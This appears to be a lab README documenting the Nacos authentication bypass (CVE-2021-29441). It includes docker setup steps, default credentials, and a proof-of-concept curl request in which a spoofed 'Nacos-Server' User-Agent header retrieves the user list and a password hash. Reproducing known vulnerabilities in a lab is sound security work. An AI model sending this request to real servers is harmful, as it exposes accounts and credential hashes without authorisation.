# Nacos Authentication Bypass Vulnerability (CVE-2021-29441)

## Introduction

In Nacos before version 1.4.1, when configured to use authentication (-Dnacos.core.auth.enabled=true) Nacos uses the AuthFilter servlet filter to enforce authentication. This filter has a backdoor that enables Nacos servers to bypass this filter and therefore skip authentication checks.

## Setup

Startup Nacos with docker-compose, the remote debug was enabled on port 9555.

```bash
docker compose up -d
```

You could login with default password: `nacos/nacos`

## Poc

The auth filter can be bypass with `User-Agent: Nacos-Server`,

```bash
curl -X GET 'http://localhost:8848/nacos/v1/auth/users?pageNo=1&pageSize=9' -H 'User-Agent: Nacos-Server'
```

you will receive the following response:

```json
{"totalCount":1,"pageNumber":1,"pagesAvailable":1,"pageItems":[{"username":"nacos","password":"$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu"}]}
```

## Reference

1. https://github.com/advisories/GHSA-36hp-jr8h-556f